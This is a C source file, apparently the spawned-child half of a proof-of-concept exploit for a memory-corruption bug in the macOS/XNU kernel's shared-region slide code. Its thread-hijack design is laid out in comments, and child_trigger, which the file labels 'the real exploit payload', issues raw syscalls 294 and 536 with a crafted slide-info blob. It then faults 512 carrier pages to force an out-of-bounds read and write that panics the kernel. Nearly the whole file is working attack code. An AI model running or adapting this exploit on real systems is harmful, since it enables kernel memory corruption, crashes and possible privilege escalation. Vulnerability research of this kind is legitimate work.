/*
 * child.c -- suspended-target helper for the shared-region first-mapper probe.
 *
 * Spawned by host.c with POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE.
 * The kernel completes exec (vm_map_exec -> vm_shared_region_enter binds a
 * fresh, EMPTY reslide region) and then leaves the task SUSPENDED, BEFORE this
 * binary's dyld runs. main() therefore never executes. The host hijacks the
 * suspended main thread, pointing its PC at child_probe() (this image's signed
 * __TEXT -- no injected/exec memory needed), and resumes.
 *
 * child_probe() runs PRE-DYLD, so it MUST use ONLY raw `svc #0x80` syscalls and
 * PC-relative static data (no libc, no GOT, no lazy binding, no __DATA pointer
 * rebasing). It calls shared_region_check_np (#294) and exits with the errno:
 *     exit  0  -> region populated (already has a first mapping)
 *     exit 12  -> ENOMEM: region BOUND but EMPTY  => viable #536 FIRST-MAPPER  [WANT]
 *     exit 22  -> EINVAL: NO region bound at all
 *
 * Build arm64 (non-e) so the host's thread_set_state needs no PAC handling.
 * Sign with get-task-allow so a same-uid host can task_for_pid() it.
 */
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include "sr_cfg.h"

/* runs pre-dyld in the hijacked child: raw syscalls only, never returns */
__attribute__((noinline, used, visibility("default")))
void child_probe(void)
{
	unsigned long long scratch = 0;
	long carry = 0, rc = 0;

	/* shared_region_check_np(&scratch) */
	{
		register long x16 asm("x16") = 294;
		register long x0  asm("x0")  = (long)&scratch;
		asm volatile(
			"svc #0x80\n\t"
			"cset %1, cs\n\t"
			: "+r"(x0), "=r"(carry)
			: "r"(x16)
			: "cc", "memory");
		rc = x0;
	}

	long code = carry ? (rc & 0xff) : 0;   /* errno on error, else 0 */

	/* exit(code) */
	{
		register long x16 asm("x16") = 1;
		register long x0  asm("x0")  = code;
		asm volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "cc", "memory");
	}
	__builtin_unreachable();
}

/*
 * child_trigger(cfg) -- the real exploit payload. Runs PRE-DYLD in the hijacked
 * child (raw syscalls only). The parent passes x0 = address of an injected
 * `struct sr_cfg` (followed by the slide-info blob); it has already parsed the
 * cache, registered both files' code signatures on their vnodes, and built
 * files[]/mappings[]. We only open the two cache files (to get fds valid in THIS
 * task), patch files[].sf_fd, fire #536 as first-mapper, check_np to nest the
 * submap, then fault the slid TARGET_PAGE to drive the OOB.
 * Exit codes (only if NO panic): errno if #536 failed; 0 if it mapped but the
 * fault did not OOB (patched/benign). A kernel panic = the OOB fired.
 */
__attribute__((noinline, used, visibility("default")))
void child_trigger(unsigned long cfgp)
{
	volatile struct sr_cfg *cfg = (volatile struct sr_cfg *)cfgp;
	long fd0, fd2, rc;

	/* fd0 = open(main_path, O_RDONLY, 0)  (SYS_open = 5) -> files[0] (header) */
	{ register long x16 asm("x16")=5; register long x0 asm("x0")=(long)cfg->main_path;
	  register long x1 asm("x1")=0; register long x2 asm("x2")=0;
	  asm volatile("svc #0x80":"+r"(x0):"r"(x16),"r"(x1),"r"(x2):"cc","memory"); fd0=x0; }
	/* fd2 = open(sub_path, O_RDONLY, 0) -> files[2] (slide carrier) */
	{ register long x16 asm("x16")=5; register long x0 asm("x0")=(long)cfg->sub_path;
	  register long x1 asm("x1")=0; register long x2 asm("x2")=0;
	  asm volatile("svc #0x80":"+r"(x0):"r"(x16),"r"(x1),"r"(x2):"cc","memory"); fd2=x0; }
	cfg->files[0].sf_fd = (int)fd0;
	cfg->files[2].sf_fd = (int)fd2;   /* files[1] stays fd=-1 (data-from-process blob inject) */

	/* rc = shared_region_map_and_slide_2_np(3, files, 3, mappings)  (SYS 536).
	 * mappings[1] is the fd=-1 mapping that copies our blob (cfg blob page, via
	 * sms_file_offset = child VA) into the shared region; mappings[2].sms_slide_start
	 * points at that shared-region address, so the post-switch slide copyin reads it. */
	{ register long x16 asm("x16")=536; register long x0 asm("x0")=3;
	  register long x1 asm("x1")=(long)cfg->files; register long x2 asm("x2")=3;
	  register long x3 asm("x3")=(long)cfg->mappings;
	  asm volatile("svc #0x80":"+r"(x0):"r"(x16),"r"(x1),"r"(x2),"r"(x3):"cc","memory"); rc=x0; }

	if (rc != 0) {
		/* #536 failed: report errno (carry set => x0 holds errno) and stop. */
		register long x16 asm("x16")=1; register long x0 asm("x0")=(rc & 0xff);
		asm volatile("svc #0x80":"+r"(x0):"r"(x16):"cc","memory");
		__builtin_unreachable();
	}

	/* check_np(&scratch): nest the region submap into our map (and arm64e
	 * auth-remap) so the slide mapping becomes faultable. */
	{ unsigned long long scratch=0; register long x16 asm("x16")=294;
	  register long x0 asm("x0")=(long)&scratch;
	  asm volatile("svc #0x80":"+r"(x0):"r"(x16):"cc","memory"); }

	/* Sweep-fault carrier pages (cfg->fault_addr = carrier base): each page's
	 * page_starts[i]=0xFFFE drives an OOB read+write chain in
	 * vm_shared_region_slide_page_v5. On a release kernel a hop that stays in the
	 * physical aperture is silent; sweeping MANY pages makes it near-certain that
	 * one chain leaves the valid aperture -> panic (with x21 == value_add). On a
	 * KASAN kernel the first OOB read panics immediately. 512 pages << carrier. */
	{ volatile unsigned char *base = (volatile unsigned char *)(uintptr_t)cfg->fault_addr;
	  for (unsigned i = 0; i < 512u; i++) { volatile unsigned char s = base[(unsigned long)i * 0x4000]; (void)s; } }

	/* survived the fault: no OOB (patched kernel / page already resident / geometry off) */
	{ register long x16 asm("x16")=1; register long x0 asm("x0")=0;
	  asm volatile("svc #0x80":"+r"(x0):"r"(x16):"cc","memory"); }
	__builtin_unreachable();
}

/* never runs (we hijack before dyld); present so this is a normal dynamic exe */
int main(void)
{
	for (;;) {
		pause();
	}
	return 0;
}
